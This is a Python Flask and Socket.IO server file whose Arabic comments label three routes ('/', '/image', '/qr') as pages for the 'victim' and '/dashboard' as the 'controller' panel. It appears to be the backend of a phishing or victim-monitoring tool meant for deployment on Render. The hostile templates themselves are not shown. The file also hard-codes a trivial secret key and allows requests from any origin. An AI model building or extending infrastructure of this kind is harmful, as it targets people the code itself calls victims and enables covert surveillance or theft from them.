import os
from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO

# تحديد المسار المطلق لضمان عمل الروابط على Render
base_dir = os.path.abspath(os.path.dirname(__file__))

app = Flask(__name__, 
            template_folder=os.path.join(base_dir, 'templates'),
            static_folder=os.path.join(base_dir, 'static'))

app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app, cors_allowed_origins="*")

# رابط الضحية (الأساسي)
@app.route('/')
def home():
    return render_template('index.html')

# رابط صفحة الصورة (الضحية)
@app.route('/image')
def image_page():
    return render_template('image.html')

# رابط صفحة QR (الضحية)
@app.route('/qr')
def qr_page():
    return render_template('qr.html')

# رابط لوحة التحكم (المتحكم) - تأكد من كتابة /dashboard كاملة
@app.route('/dashboard')
def dashboard():
    return render_template('dashboard.html')

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    socketio.run(app, host='0.0.0.0', port=port)
